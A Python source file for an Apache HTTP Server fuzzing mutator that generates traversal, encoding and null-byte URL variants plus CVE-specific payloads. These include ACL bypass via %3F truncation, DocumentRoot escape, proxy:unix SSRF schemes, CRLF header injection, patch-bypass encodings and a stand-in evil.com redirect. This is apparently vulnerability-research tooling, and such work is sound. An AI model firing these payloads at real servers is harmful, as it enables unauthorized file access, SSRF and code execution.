"""Apache Confusion URL mutator — domain-specific mutations.

Beyond grammar-based generation, applies URL-level mutations targeting
Apache module interaction confusion:
  - Encoding swap (single/double/mixed encoding)
  - Traversal injection at path boundaries
  - Path parameter injection (;param=value)
  - Extension swap (handler confusion)
  - Null byte insertion
  - Slash manipulation

Campaign-aware CVE-specific strategies (added 2026-03-16):
  - %3F truncation (CVE-2024-38474): path truncation + args injection
  - DocumentRoot escape (CVE-2024-38475): /usr/share gadget access
  - SetHandler bypass (CVE-2024-38473): extension confusion + ACL bypass
  - Prefix SSRF (CVE-2024-39573): proxy:scheme:// injection
  - CRLF handler (CVE-2024-38476): response header injection
  - Patch bypass: encoding variants to evade unsafe_qmark/prefix_stat
"""

from __future__ import annotations

import random
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed


class ApacheConfusionMutator:
    """Domain-specific URL mutator for Apache confusion fuzzing."""

    name = "apache_confusion"

    def __init__(self, seed: int | None = None, campaign_mode: str = "novel") -> None:
        self.rng = random.Random(seed)
        self.campaign_mode = campaign_mode

    # ── Mutation strategies ───────────────────────────────────────

    _TRAVERSALS = (
        "..", "%2e%2e", "%2e.", ".%2e", "..;", "..%00",
        "%252e%252e", "%c0%ae%c0%ae",
    )

    _ENCODED_SLASHES = (
        "%2f", "%5c", "%252f", "%255c", "\\",
    )

    _PATH_PARAMS = (
        ";", ";jsessionid=fuzz", ";a=b", "%3b", "%3B",
    )

    _EXTENSIONS = (
        ".php", ".cgi", ".jsp", ".py", ".pl", ".html", ".txt",
    )

    _NULL_BYTES = ("%00", "%00.", "%00/")

    _GENERIC_STRATEGIES = (
        "_mutate_encoding_swap",
        "_mutate_traversal_inject",
        "_mutate_path_param_inject",
        "_mutate_extension_swap",
        "_mutate_null_byte_inject",
        "_mutate_slash_manipulate",
        "_mutate_segment_shuffle",
    )

    _CVE_STRATEGIES = (
        "_mutate_cve_38474_qmark",
        "_mutate_cve_38475_docroot",
        "_mutate_cve_38473_sethandler",
        "_mutate_cve_39573_prefix",
        "_mutate_cve_38476_crlf",
    )

    _PATCH_BYPASS_STRATEGIES = (
        "_mutate_patch_bypass",
    )

    # ── CVE-specific constants ────────────────────────────────────

    _QMARK_ENCODINGS = ("%3F", "%253F", "%25%33%46", "%%33%46", "%c0%3f")

    _DOCROOT_GADGETS = (
        "/usr/share/doc/", "/usr/share/php/", "/usr/share/perl/",
        "/usr/share/javascript/", "/usr/share/libreoffice/help/",
        "/usr/share/cacti/site/", "/usr/share/redmine/",
    )

    _PROXY_SCHEMES = (
        "proxy:fcgi://localhost/", "proxy:scgi://localhost:4000/",
        "proxy:ajp://localhost:8009/",
        "proxy:unix:/run/php/php-fpm.sock|fcgi://localhost/",
        "proxy:unix:/tmp/sock|http://localhost/",
    )

    _CRLF_HEADERS = (
        "Content-Type:server-status",
        "Content-Type:application/x-httpd-php",
        "Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://localhost/tmp/x.php",
        "Content-Type:proxy:ajp://localhost:8009/",
    )

    @property
    def _STRATEGIES(self):
        """Select strategies based on campaign mode."""
        if self.campaign_mode == "cve_detect":
            # 80% CVE-specific, 20% generic
            return self._CVE_STRATEGIES * 4 + self._GENERIC_STRATEGIES
        elif self.campaign_mode == "patch_bypass":
            return self._PATCH_BYPASS_STRATEGIES * 5 + self._CVE_STRATEGIES
        else:  # novel
            return self._GENERIC_STRATEGIES

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        """Apply a random URL mutation."""
        url = inp.data.decode("utf-8", errors="replace")

        # Pick 1-2 strategies
        n = self.rng.choice([1, 1, 1, 2])
        strategies = self.rng.sample(self._STRATEGIES, min(n, len(self._STRATEGIES)))

        for strategy_name in strategies:
            fn = getattr(self, strategy_name)
            url = fn(url)

        return Input(
            data=url.encode("utf-8"),
            metadata={
                "mutator": self.name,
                "source": "mutation",
            },
        )

    def _mutate_encoding_swap(self, url: str) -> str:
        """Replace a random / with an encoded variant, or encode a dot."""
        slash_positions = [i for i, c in enumerate(url) if c == "/"]
        if slash_positions and self.rng.random() < 0.5:
            pos = self.rng.choice(slash_positions)
            repl = self.rng.choice(self._ENCODED_SLASHES)
            return url[:pos] + repl + url[pos + 1:]

        dot_positions = [i for i, c in enumerate(url) if c == "."]
        if dot_positions:
            pos = self.rng.choice(dot_positions)
            repl = self.rng.choice(("%2e", "%252e", "%c0%ae"))
            return url[:pos] + repl + url[pos + 1:]

        return url

    def _mutate_traversal_inject(self, url: str) -> str:
        """Insert a traversal sequence at a path boundary."""
        parts = url.split("/")
        if len(parts) < 2:
            return url
        pos = self.rng.randint(1, len(parts) - 1)
        traversal = self.rng.choice(self._TRAVERSALS)
        parts.insert(pos, traversal)
        return "/".join(parts)

    def _mutate_path_param_inject(self, url: str) -> str:
        """Inject a path parameter (;param) at a random position."""
        slash_positions = [i for i, c in enumerate(url) if c == "/"]
        if not slash_positions:
            return url + self.rng.choice(self._PATH_PARAMS)
        pos = self.rng.choice(slash_positions)
        param = self.rng.choice(self._PATH_PARAMS)
        return url[:pos] + param + url[pos:]

    def _mutate_extension_swap(self, url: str) -> str:
        """Replace or append a file extension to trigger handler confusion."""
        dot_pos = url.rfind(".")
        slash_pos = url.rfind("/")
        if dot_pos > slash_pos and dot_pos > 0:
            # Replace existing extension
            ext = self.rng.choice(self._EXTENSIONS)
            return url[:dot_pos] + ext
        # Append extension
        ext = self.rng.choice(self._EXTENSIONS)
        qpos = url.find("?")
        if qpos > 0:
            return url[:qpos] + ext + url[qpos:]
        return url + ext

    def _mutate_null_byte_inject(self, url: str) -> str:
        """Insert a null byte at a path boundary."""
        slash_positions = [i for i, c in enumerate(url) if c == "/"]
        if not slash_positions:
            return url
        pos = self.rng.choice(slash_positions)
        null = self.rng.choice(self._NULL_BYTES)
        return url[:pos] + null + url[pos:]

    def _mutate_slash_manipulate(self, url: str) -> str:
        """Double slashes, add ./  or trailing slash."""
        choice = self.rng.randint(0, 3)
        if choice == 0:
            # Double a random slash
            slash_positions = [i for i, c in enumerate(url) if c == "/"]
            if slash_positions:
                pos = self.rng.choice(slash_positions)
                return url[:pos] + "//" + url[pos + 1:]
        elif choice == 1:
            # Insert /./ at random position
            slash_positions = [i for i, c in enumerate(url) if c == "/"]
            if slash_positions:
                pos = self.rng.choice(slash_positions)
                return url[:pos] + "/./" + url[pos + 1:]
        elif choice == 2:
            # Add trailing slash
            if not url.endswith("/"):
                return url + "/"
        else:
            # Remove trailing slash
            if url.endswith("/") and len(url) > 1:
                return url[:-1]
        return url

    def _mutate_segment_shuffle(self, url: str) -> str:
        """Swap two path segments to test order-dependent processing."""
        parts = url.split("/")
        if len(parts) < 3:
            return url
        # Pick two non-empty segments
        non_empty = [i for i in range(1, len(parts)) if parts[i]]
        if len(non_empty) < 2:
            return url
        a, b = self.rng.sample(non_empty, 2)
        parts[a], parts[b] = parts[b], parts[a]
        return "/".join(parts)

    # ── CVE-specific mutations ────────────────────────────────────

    def _mutate_cve_38474_qmark(self, url: str) -> str:
        """CVE-2024-38474: Inject %3F to truncate path + inject r->args."""
        qmark = self.rng.choice(self._QMARK_ENCODINGS)
        parts = url.rstrip("/").rsplit("/", 1)
        if len(parts) == 2:
            prefix, last = parts
            # Insert %3F before the last segment's extension or at end
            dot = last.rfind(".")
            if dot > 0 and self.rng.random() < 0.5:
                # Truncate at extension: secret.yml%3F → access secret.yml
                return f"{prefix}/{last[:dot]}{qmark}{last[dot:]}"
            # Append args payload
            args_payloads = ("", "ignore", "role=admin", "admin=true%26delete=all",
                            "redirect_uri=https:%2F%2Fevil.com")
            payload = self.rng.choice(args_payloads)
            return f"{prefix}/{last}{qmark}{payload}"
        return url + qmark

    def _mutate_cve_38475_docroot(self, url: str) -> str:
        """CVE-2024-38475: Escape DocumentRoot via RewriteRule substitution."""
        gadget = self.rng.choice(self._DOCROOT_GADGETS)
        # Detect rewrite trigger prefix (/files/, /html/, etc.)
        prefixes = ("/files/", "/html/", "/x/", "/app/", "/static/")
        prefix = self.rng.choice(prefixes)
        # Append common files after gadget
        suffixes = ("", "index.html", "README", "setup.php",
                    "magpie_debug.php", "config.php", "secret_key.txt")
        suffix = self.rng.choice(suffixes)
        return f"{prefix}{gadget.lstrip('/')}{suffix}"

    def _mutate_cve_38473_sethandler(self, url: str) -> str:
        """CVE-2024-38473: FilesMatch + SetHandler ACL bypass via %3F."""
        targets = ("admin.php", "config.php", "wp-config.php",
                   "xmlrpc.php", ".htaccess", "wp-admin/index.php")
        target = self.rng.choice(targets)
        qmark = self.rng.choice(self._QMARK_ENCODINGS[:2])  # %3F or %253F
        extensions = ("ooo.php", "test.php", ".bak", ".txt")
        ext = self.rng.choice(extensions)
        return f"/{target}{qmark}{ext}"

    def _mutate_cve_39573_prefix(self, url: str) -> str:
        """CVE-2024-39573: Inject proxy: scheme via RewriteRule prefix control."""
        scheme = self.rng.choice(self._PROXY_SCHEMES)
        # The /broken prefix is from the RewriteRule ^/broken(.*)$ $1
        prefixes = ("/broken", "/prefix", "/redir", "/old")
        prefix = self.rng.choice(prefixes)
        return f"{prefix}{scheme}"

    def _mutate_cve_38476_crlf(self, url: str) -> str:
        """CVE-2024-38476: CRLF injection in CGI redirect → handler invocation."""
        header = self.rng.choice(self._CRLF_HEADERS)
        cgi_paths = ("/cgi-bin/redir.cgi", "/cgi-bin/test.cgi",
                     "/cgi-bin/redirect.pl", "/cgi-bin/handler.py")
        cgi = self.rng.choice(cgi_paths)
        location = self.rng.choice(("/ooo", "/app", "/test", "/health"))
        return f"{cgi}?r=http://%0d%0aLocation:{location}%0d%0a{header}%0d%0a%0d%0a"

    def _mutate_patch_bypass(self, url: str) -> str:
        """Attempt to bypass 2.4.60+ patches (unsafe_qmark, prefix_stat, TRUSTED_CT)."""
        choice = self.rng.randint(0, 4)
        if choice == 0:
            # Double/triple encode %3F
            encodings = ("%253F", "%25253F", "%%33%46", "%25%33%46",
                         "%c0%3f", "%e0%80%bf", "%f0%80%80%bf")
            enc = self.rng.choice(encodings)
            return url.replace("%3F", enc) if "%3F" in url else url + enc
        elif choice == 1:
            # Double encode dots for docroot escape
            return url.replace("..", "%252e%252e").replace("/", "%252f", 1)
        elif choice == 2:
            # Overlong UTF-8 for dot
            return url.replace(".", "%c0%ae", 1)
        elif choice == 3:
            # Null byte before %3F
            return url.replace("%3F", "%00%3F") if "%3F" in url else url
        else:
            # Tab/CR before encoded char
            return url.replace("%3F", "%09%3F") if "%3F" in url else url
